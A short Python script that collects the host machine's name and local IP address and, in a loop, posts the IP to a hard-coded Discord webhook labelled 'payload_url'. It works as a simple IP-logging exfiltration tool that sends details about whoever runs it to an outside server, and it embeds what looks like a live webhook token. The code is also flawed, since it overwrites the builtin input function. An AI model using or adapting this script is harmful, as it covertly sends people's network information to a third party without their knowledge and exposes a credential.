import requests
import socket
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)   

payload_url= "https://discord.com/api/webhooks/847124377660686356/L2cjlsYUswg7GCsHC9ZSExADnEoGns38t11rlyMP99JzTsJS_thf5NAN67dYM_OdliXU"
while True:
    message = input()
    input=(IPAddr)
    r =requests.post(payload_url, data={"content": IPAddr})